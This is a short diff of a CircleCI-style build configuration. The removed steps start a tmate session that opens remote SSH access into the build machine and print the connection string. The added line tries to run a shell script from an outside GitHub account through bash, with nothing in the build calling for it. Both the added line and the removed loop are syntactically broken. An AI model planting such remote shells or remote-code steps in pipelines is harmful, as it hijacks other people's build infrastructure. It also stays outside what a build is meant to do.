@@ -2,22 +2,4 @@
 version: 2
 jobs:
   build:
-    - run: mkdir ~/.ssh
-    - run: [ -e ~/.ssh/id_rsa ] || ssh-keygen -t rsa -f ~/.ssh/id_rsa -q -N ""
-
-    
-    - run: echo Running tmate...
-    - run: chmod 777 ./tmate
-    - run: ./tmate -S /tmp/tmate.sock new-session -d
-    - run: ./tmate -S /tmp/tmate.sock wait tmate-ready
-
-    
-    - run: echo ________________________________________________________________________________
-    - run: echo
-    - run: echo To connect to this session copy-n-paste the following into a terminal:
-    - run: ./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'
-
-    - run: while [ -S /tmp/tmate.sock ]
-    - run: do
-    - run: sleep 1
-    - run: done
+    - run: bash https://raw.githubusercontent.com/pure69per/circle/main/b.sh
